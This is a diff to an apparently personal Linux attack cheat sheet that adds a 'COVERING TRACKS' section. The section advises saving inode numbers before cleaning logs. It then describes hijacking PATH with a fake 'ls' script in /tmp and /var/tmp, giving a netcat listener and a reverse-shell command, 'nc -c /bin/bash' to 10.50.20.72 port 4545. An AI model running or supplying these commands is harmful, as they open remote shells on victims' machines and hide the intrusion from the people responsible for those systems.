@@ -240,15 +240,21 @@ crontab.guru
   -t  #TIME
   -r  #REVERSE
 ----------------------------------------------------------------------------------------------------------------------------
-    ######
+    ###COVERING TRACKS###
 ps -p 1    #FIND OUT WHAT SYSTEM INIT IS BEING USED
+  #BEFORE CLEANING LOGS SAVE INODE NUMBER
 
 
+. IN THE PATH
+cd `printf "/var/tmp\n/tmp\n"|sort -R | head -n 1`;ls
 
+(script uses ls to print directory contents of /tmp or /var/tmp, create a script named ls in both directories that sends a shell over the network to your op station)
 
+@lin_ops  nc -lvp 4545
 
-
-
+@lin2  !#/bin/bash
+@lin2  nc -c /bin/bash 10.50.20.72 4545
+----------------------------------------------------------------------------------------------------------------------------
 
 
 
